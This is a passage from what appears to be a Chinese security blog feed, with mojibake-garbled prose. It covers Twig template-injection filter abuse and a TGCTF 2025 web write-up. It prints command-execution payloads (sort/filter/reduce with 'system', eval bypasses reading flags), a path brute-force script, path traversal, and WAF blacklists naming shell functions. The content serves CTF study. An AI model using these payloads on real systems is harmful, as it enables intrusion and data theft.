    &#123;name: &#x27;Apples&#x27;, quantity: 5&#125;,
    &#123;name: &#x27;Oranges&#x27;, quantity: 2&#125;,
    &#123;name: &#x27;Grapes&#x27;, quantity: 4&#125;,
] %&#125;

&#123;% for fruit in fruits|sort((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|column(&#x27;name&#x27;) %&#125;
    &#123;&#123; fruit &#125;&#125;
&#123;% endfor %&#125;

&#123;# output in this order: Oranges, Grapes, Apples #&#125;</code></pre>

<p>ç±»ä¼¼äº <code>map</code>ï¼Œæ¨¡æ¿ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¼šè¿›å…¥ <code>twig_sort_filter</code> å‡½æ•°ï¼Œè¿™ä¸ª <code>twig_sort_filter</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">function twig_sort_filter($array, $arrow = null)
&#123;
    if ($array instanceof \Traversable) &#123;
        $array = iterator_to_array($array);
    &#125; elseif (!\is_array($array)) &#123;
        throw new RuntimeError(sprintf(&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;, \gettype($array)));
    &#125;

    if (null !== $arrow) &#123;
        uasort($array, $arrow);    // ç›´æ¥è¢« uasort è°ƒç”¨ 
    &#125; else &#123;
        asort($array);
    &#125;

    return $array;
&#125;</code></pre>

<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>$array</code> å’Œ <code>$arrow</code> ç›´æ¥è¢« <code>uasort</code> å‡½æ•°è°ƒç”¨ã€‚ä¼—æ‰€å‘¨çŸ¥ <code>uasort</code> å‡½æ•°å¯ä»¥ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„æ¯”è¾ƒå‡½æ•°å¯¹æ•°ç»„ä¸­çš„å…ƒç´ æŒ‰é”®å€¼è¿›è¡Œæ’åºï¼Œå¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œï¼š</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;,0];
php &gt; usort($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>

<p>çŸ¥é“äº†åšè¿™äº›æˆ‘ä»¬ä¾¿å¯ä»¥æ„é€  Payload äº†ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;    // æ— å›æ˜¾</code></pre>

<p><strong>filter</strong></p>
<p>è¿™ä¸ª <code>filter</code> è¿‡æ»¤å™¨ä½¿ç”¨ç®­å¤´å‡½æ•°æ¥è¿‡æ»¤åºåˆ—æˆ–æ˜ å°„ä¸­çš„å…ƒç´ ã€‚ç®­å¤´å‡½æ•°ç”¨äºæ¥æ”¶åºåˆ—æˆ–æ˜ å°„çš„å€¼ï¼š</p>
<pre><code class="highlight plaintext">&#123;% set lists = [34, 36, 38, 40, 42] %&#125;
&#123;&#123; lists|filter(v =&gt; v &gt; 38)|join(&#x27;, &#x27;) &#125;&#125;

// Output: 40, 42</code></pre>

<p>ç±»ä¼¼äº <code>map</code>ï¼Œæ¨¡æ¿ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¼šè¿›å…¥ <code>twig_array_filter</code> å‡½æ•°ï¼Œè¿™ä¸ª <code>twig_array_filter</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">function twig_array_filter($array, $arrow)
&#123;
    if (\is_array($array)) &#123;
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array å’Œ $arrow ç›´æ¥è¢« array_filter å‡½æ•°è°ƒç”¨
    &#125;

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
&#125;</code></pre>

<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>$array</code> å’Œ <code>$arrow</code> ç›´æ¥è¢« <code>array_filter</code> å‡½æ•°è°ƒç”¨ã€‚ <code>array_filter</code> å‡½æ•°å¯ä»¥ç”¨å›è°ƒå‡½æ•°è¿‡æ»¤æ•°ç»„ä¸­çš„å…ƒç´ ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œï¼š</p>
<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;];
php &gt; array_filter($arr,&quot;system&quot;);
uid=0(root) gid=0(root) groups=0(root)
php &gt;</code></pre>

<pre><code class="highlight plaintext">poc:
&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|filter(&quot;exec&quot;)&#125;&#125;    // æ— å›æ˜¾</code></pre>



<p><strong>reduce</strong></p>
<p>è¿™ä¸ª <code>reduce</code> è¿‡æ»¤å™¨ä½¿ç”¨ç®­å¤´å‡½æ•°è¿­ä»£åœ°å°†åºåˆ—æˆ–æ˜ å°„ä¸­çš„å¤šä¸ªå…ƒç´ ç¼©å‡ä¸ºå•ä¸ªå€¼ã€‚ç®­å¤´å‡½æ•°æ¥æ”¶ä¸Šä¸€æ¬¡è¿­ä»£çš„è¿”å›å€¼å’Œåºåˆ—æˆ–æ˜ å°„çš„å½“å‰å€¼ï¼š</p>
<pre><code class="highlight plaintext">&#123;% set numbers = [1, 2, 3] %&#125;
&#123;&#123; numbers|reduce((carry, v) =&gt; carry + v) &#125;&#125;
// Output: 6</code></pre>

<p>ç±»ä¼¼äº <code>map</code>ï¼Œæ¨¡æ¿ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¼šè¿›å…¥ <code>twig_array_reduce</code> å‡½æ•°ï¼Œè¿™ä¸ª <code>twig_array_reduce</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">function twig_array_reduce($array, $arrow, $initial = null)
&#123;
    if (!\is_array($array)) &#123;
        $array = iterator_to_array($array);
    &#125;

    return array_reduce($array, $arrow, $initial);    // $array, $arrow å’Œ $initial ç›´æ¥è¢« array_reduce å‡½æ•°è°ƒç”¨
&#125;</code></pre>

<p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ°ï¼Œ<code>$array</code> å’Œ <code>$arrow</code> ç›´æ¥è¢« <code>array_filter</code> å‡½æ•°è°ƒç”¨ã€‚ <code>array_reduce</code> å‡½æ•°å¯ä»¥å‘é€æ•°ç»„ä¸­çš„å€¼åˆ°ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœæˆ‘ä»¬è‡ªå®šä¹‰ä¸€ä¸ªå±é™©å‡½æ•°ï¼Œå°†é€ æˆä»£ç æ‰§è¡Œæˆ–å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>ç›´æ¥ç»™å‡º Payloadï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)&#125;&#125;
&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;id&quot;)&#125;&#125;    // æ— å›æ˜¾</code></pre>

]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>TGCTF_Writeup</title>
    <url>/2025/04/18/TGCTF-Writeup/</url>
    <content><![CDATA[<h1 id="TGCTF2025"><a href="#TGCTF2025" class="headerlink" title="TGCTF2025"></a>TGCTF2025</h1><p>è¿™æ¯”èµ›è¯´ä»–å¥½å§ï¼Œç¡®å®è®©æˆ‘å‘ç°è‡ªå·±çš„çŸ¥è¯†ç‚¹æ¼æ´æœ‰å¤šå¤§(å“ˆå“ˆï¼Œè¿˜æ˜¯è¿‡è¿‡çš„çŸ¥è¯†ç‚¹ï¼Œæ¨ä¸å¾—ç»™è‡ªå·±ä¸€å·´æŒï¼Œå·®ç‚¹å°±å¯ä»¥å·é“ºç›–èµ°äººäº†)ã€‚è¯´å·®ï¼Œä½ å—çš„å‰ç«¯æ¸¸æˆæˆ‘ä¸€ç›´ä»¥ä¸ºé¢˜ç›®å°±æ˜¯é‚£ä¸ªé”™è¯¯é¡µé¢ï¼Œç¬¬äºŒå¤©åˆå¼€æ‰å‘ç°æ˜¯æ­£å¸¸çš„å‰ç«¯æ¸¸æˆï¼Œæ„å¼é¶æœºã€‚ã€‚ã€‚è¿˜æœ‰ä¸€å †è«åå…¶å¦™çš„è„‘æ´å’Œå¯¹ç”µæ³¢ç¯èŠ‚ï¼Œæœ‰ç‚¹ã€‚ã€‚äº†å§</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AAAå·æ¸¡é˜´å¹³"><a href="#AAAå·æ¸¡é˜´å¹³" class="headerlink" title="AAAå·æ¸¡é˜´å¹³"></a><strong>AAAå·æ¸¡é˜´å¹³</strong></h3><pre><code class="highlight php"> <span class="meta">&lt;?php</span>


<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];

<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</code></pre>

<p>ä¸€çœ¼æ— å‚RCEã€‚ã€‚ç½‘ä¸Šéšä¾¿æ‰¾ä¸ªpocè¿‡äº†</p>
<pre><code class="highlight php">?tgctf2025=<span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;jiang=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /f*&#x27;</span>);</code></pre>

<h3 id="ç«çœ¼è¾©é­‘é­…"><a href="#ç«çœ¼è¾©é­‘é­…" class="headerlink" title="ç«çœ¼è¾©é­‘é­…"></a><strong>ç«çœ¼è¾©é­‘é­…</strong></h3><p>robots.txt </p>
<pre><code class="highlight plaintext">User-Agent: *
Disallow: tgupload.php
Disallow: tgshell.php
Disallow: tgxff.php
Disallow: tgser.php
Disallow: tgphp.php
Disallow: tginclude.phphttp://node1.tgctf.woooo.tech:32484/</code></pre>

<p>æˆ‘æ˜¯å”‡ç¬”æ‰€ä»¥å‡€å–œæ¬¢èµ°å¼¯è·¯å“ˆå“ˆã€‚ã€‚</p>
<p>æ˜æ˜é¢˜é¢å·²ç»è¯´è¦çœ‹å“ªä¸ªäº†</p>
<p>ç¨å¾®å°è¯•äº†ä¸€ä¸‹å‘ç°system,passthruè¿™äº›åŸºæœ¬éƒ½è¢«banäº†</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250412143217444.png" alt="image-20250412143217444"></p>
<pre><code class="highlight plaintext">shell=echo `cat /tg*`;</code></pre>

<p>ä½†æ˜¯èµ›åçœ‹å®˜æ–¹WPçœ‹çº¢æ¸©äº†å“ˆå“ˆï¼Œå®˜æ–¹ç»™çš„æ˜¯tgxff.phpç„¶åç”¨sstiæ‰“ï¼Œè¯´æ˜¯å…¶ä»–èƒ½æ‰“å‡ºæ¥å°±æ˜¯éé¢„æœŸå“¦ï¼Œé‰´å®šä¸ºå²</p>
<p>åŒæ—¶ä¸Šé¢è¿™ä¸ªshellå…¶å®ç›´æ¥è¿éƒ½å¯ä»¥ã€‚ã€‚ã€‚ç®—æ˜¯ç»•å¼¯äº†</p>
<h3 id="AAAå·æ¸¡é˜´å¹³-å¤ä»‡"><a href="#AAAå·æ¸¡é˜´å¹³-å¤ä»‡" class="headerlink" title="AAAå·æ¸¡é˜´å¹³(å¤ä»‡)"></a><strong>AAAå·æ¸¡é˜´å¹³(å¤ä»‡)</strong></h3><p>banäº†æ— å‚RCEï¼Œä½†æ˜¯ä¸€æ ·æ‰“</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
<span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];
<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;
    <span class="comment">//hintï¼šä½ å¯ä»¥å¯¹ç€é”®ç›˜ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œç„¶ååœ¨æ²¡è¿‡æ»¤çš„ç¬¦å·ä¸Šç”¨è®°å·ç¬”ç”»ä¸€ä¸‹ï¼ˆbushi</span>
    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);
&#125;
<span class="keyword">else</span>&#123;
    <span class="keyword">die</span>(<span class="string">&#x27;(â•¯â€µâ–¡â€²)â•¯ç‚¸å¼¹ï¼â€¢â€¢â€¢*ï½â—&#x27;</span>);
&#125;

<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
</code></pre>

<p>poc:</p>
<pre><code class="highlight php">?tgctf2025=<span class="title function_ invoke__">session_start</span>();<span class="title function_ invoke__">passthru</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()));
PHPSESSID=<span class="number">636174202</span>f666c6167</code></pre>

<h3 id="ç›´é¢å¤©å‘½"><a href="#ç›´é¢å¤©å‘½" class="headerlink" title="ç›´é¢å¤©å‘½"></a><strong>ç›´é¢å¤©å‘½</strong></h3><p>å…ˆçœ‹ä¸€çœ¼æºç </p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221047192.png" alt="image-20250413221047192"></p>
<p>æ¢hint</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221120246.png" alt="image-20250413221120246"></p>
<p>ã€‚ã€‚æ‡’å¾—å–·ï¼Œæˆ‘ç›´æ¥ptä¹°hintäº†å“ˆå“ˆ</p>
<p>è¿™é‡Œè´´ä¸€ä¸‹é˜Ÿé‡Œå¸ˆå‚…çš„è„šæœ¬</p>
<pre><code class="highlight py"><span class="keyword">import</span> requests
<span class="keyword">import</span> itertools
<span class="keyword">import</span> string
<span class="keyword">import</span> time
<span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor

<span class="comment"># ç›®æ ‡ç½‘ç«™çš„åŸºç¡€URL - ä½¿ç”¨å‰è¯·æ›¿æ¢ä¸ºå®é™…ç›®æ ‡URL</span>
BASE_URL = <span class="string">&quot;http://node2.tgctf.woooo.tech:32010/&quot;</span>  <span class="comment"># è¯·æ›¿æ¢ä¸ºå®é™…ç›®æ ‡URL</span>

<span class="comment"># ä½¿ç”¨æ‰€æœ‰26ä¸ªå°å†™å­—æ¯</span>
all_letters = string.ascii_lowercase  <span class="comment"># &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>

<span class="comment"># å®šä¹‰æµ‹è¯•å•ä¸ªè·¯å¾„çš„å‡½æ•°</span>


<span class="keyword">def</span> <span class="title function_">test_path</span>(<span class="params">path</span>):
    url = BASE_URL + path
    <span class="keyword">try</span>:
        response = requests.get(url, timeout=<span class="number">3</span>)

        <span class="comment"># æ ¹æ®çŠ¶æ€ç å’Œå“åº”é•¿åº¦æ¥åˆ¤æ–­æ˜¯å¦æ‰¾åˆ°æœ‰æ•ˆé¡µé¢</span>
        status = response.status_code
        length = <span class="built_in">len</span>(response.text)

        <span class="comment"># è®°å½•æ‰€æœ‰é404å“åº”</span>
        <span class="keyword">if</span> status != <span class="number">404</span>:
            <span class="built_in">print</span>(<span class="string">f&quot;[+] å‘ç°: <span class="subst">&#123;url&#125;</span> (çŠ¶æ€ç : <span class="subst">&#123;status&#125;</span>, é•¿åº¦: <span class="subst">&#123;length&#125;</span>)&quot;</span>)

            <span class="comment"># ä¿å­˜å‘ç°çš„è·¯å¾„åˆ°æ–‡ä»¶ä¸­</span>
            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;found_paths.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:
                f.write(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span> (çŠ¶æ€ç : <span class="subst">&#123;status&#125;</span>, é•¿åº¦: <span class="subst">&#123;length&#125;</span>)\n&quot;</span>)

            <span class="comment"># å¦‚æœæ˜¯200çŠ¶æ€ç ï¼Œä¿å­˜å“åº”å†…å®¹ä»¥ä¾¿æ£€æŸ¥</span>
            <span class="keyword">if</span> status == <span class="number">200</span>:
                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;response_<span class="subst">&#123;path&#125;</span>.html&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:
                    f.write(response.text)

    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:
        <span class="keyword">pass</span>  <span class="comment"># å¿½ç•¥è¿æ¥é”™è¯¯ï¼Œç»§ç»­æµ‹è¯•</span>

    <span class="keyword">return</span> path


<span class="comment"># æ˜¾ç¤ºå¼€å§‹ä¿¡æ¯</span>
<span class="built_in">print</span>(<span class="string">&quot;[*] å¼€å§‹çˆ†ç ´æ‰€æœ‰4å­—æ¯è·¯å¾„...&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] ç›®æ ‡URL: <span class="subst">&#123;BASE_URL&#125;</span>&quot;</span>)
<span class="built_in">print</span>(<span class="string">f&quot;[*] æ€»ç»„åˆæ•°: <span class="subst">&#123;<span class="number">26</span>**<span class="number">4</span>&#125;</span> (è¿™å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´)&quot;</span>)

<span class="comment"># è·Ÿè¸ªè¿›åº¦å˜é‡</span>
total_combinations = <span class="number">26</span>**<span class="number">4</span>  <span class="comment"># å¯èƒ½çš„4å­—æ¯ç»„åˆæ€»æ•°</span>
completed = <span class="number">0</span>
start_time = time.time()

<span class="comment"># ä½¿ç”¨å¤šçº¿ç¨‹åŠ é€Ÿè¿‡ç¨‹</span>
<span class="keyword">with</span> ThreadPoolExecutor(max_workers=<span class="number">20</span>) <span class="keyword">as</span> executor:
    <span class="comment"># ç”Ÿæˆå¹¶æµ‹è¯•æ‰€æœ‰4å­—æ¯ç»„åˆ</span>
    <span class="keyword">for</span> combo <span class="keyword">in</span> itertools.product(all_letters, repeat=<span class="number">4</span>):
        path = <span class="string">&#x27;&#x27;</span>.join(combo)
        executor.submit(test_path, path)

        <span class="comment"># å®šæœŸæ›´æ–°è¿›åº¦</span>
        completed += <span class="number">1</span>
        <span class="keyword">if</span> completed % <span class="number">5000</span> == <span class="number">0</span>:
            elapsed = time.time() - start_time
            percentage = (completed / total_combinations) * <span class="number">100</span>
            rate = completed / elapsed <span class="keyword">if</span> elapsed &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>
            remaining = (total_combinations - completed) / \
                rate <span class="keyword">if</span> rate &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span>

            <span class="built_in">print</span>(<span class="string">f&quot;[*] è¿›åº¦: <span class="subst">&#123;completed&#125;</span>/<span class="subst">&#123;total_combinations&#125;</span> (<span class="subst">&#123;percentage:<span class="number">.2</span>f&#125;</span>%) - &quot;</span>
                  <span class="string">f&quot;å·²ç”¨æ—¶é—´: <span class="subst">&#123;elapsed:<span class="number">.1</span>f&#125;</span>ç§’ - é¢„è®¡å‰©ä½™: <span class="subst">&#123;remaining:<span class="number">.1</span>f&#125;</span>ç§’ - é€Ÿåº¦: <span class="subst">&#123;rate:<span class="number">.1</span>f&#125;</span>è¯·æ±‚/ç§’&quot;</span>)

<span class="built_in">print</span>(<span class="string">&quot;[*] çˆ†ç ´å®Œæˆ! æŸ¥çœ‹ &#x27;found_paths.txt&#x27; è·å–ç»“æœã€‚&quot;</span>)</code></pre>

<p><code>/aazz</code></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250413221221814.png" alt="image-20250413221221814"></p>
<p>â€¦å‚â€¦æ•°â€¦â€¦?é‚£æˆ‘é—®ä½ ï¼Œå‚æ•°åæ˜¯ä»€ä¹ˆï¼Œé‚£æˆ‘é—®ä½ (ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘æ²¡è¿›ç¾¤æ‰€ä»¥æ²¡çœ‹åˆ°ç±»ä¼¼é€šçŸ¥çš„ç¼˜æ•…)</p>
<p>åæ­£åé¢çŸ¥é“æ˜¯filename(èµ›åçŸ¥é“è¿™ä¸ªä¹Ÿæ˜¯è¦fuzzå‡ºæ¥çš„),çœ‹åå­—åº”è¯¥å°±æ˜¯ä»»æ„æ–‡ä»¶è¯»å–äº†</p>
<p>ç¨å¾®è¯•ä¸€ä¸‹å•Š</p>
<p>é¢„æœŸåº”è¯¥æ˜¯æŠ“æºç çš„ï¼Œç»“æœå“ˆå“ˆ</p>
<pre><code class="highlight plaintext">aazz?filename=../../flag</code></pre>

<p>è´´ä¸€ä¸ªæºç å§</p>
<pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

black_list=[<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span></code></pre>



<h3 id="ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"><a href="#ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰" class="headerlink" title="ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰"></a><strong>ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰</strong></h3><pre><code class="highlight python"><span class="keyword">import</span> os
<span class="keyword">import</span> string
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory
<span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key

app = Flask(__name__)

black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]
<span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):
    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:
        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():
            <span class="keyword">return</span> <span class="literal">True</span>
    <span class="keyword">return</span> <span class="literal">False</span>
<span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):
    <span class="comment"># å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›†</span>
    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace
    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">home</span>():
    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">greet</span>():
    template1=<span class="string">&quot;&quot;</span>
    template2=<span class="string">&quot;&quot;</span>
    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)
    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>
    <span class="keyword">if</span> waf(name):
        template = <span class="string">&#x27;æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹</span>
<span class="string">Image&#x27;</span>
    <span class="keyword">else</span>:
        k=<span class="number">0</span>
        <span class="keyword">for</span> i <span class="keyword">in</span> name:
            <span class="keyword">if</span> is_typable(i):
                <span class="keyword">continue</span>
            k=<span class="number">1</span>
            <span class="keyword">break</span>
        <span class="keyword">if</span> k==<span class="number">1</span>:
            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):
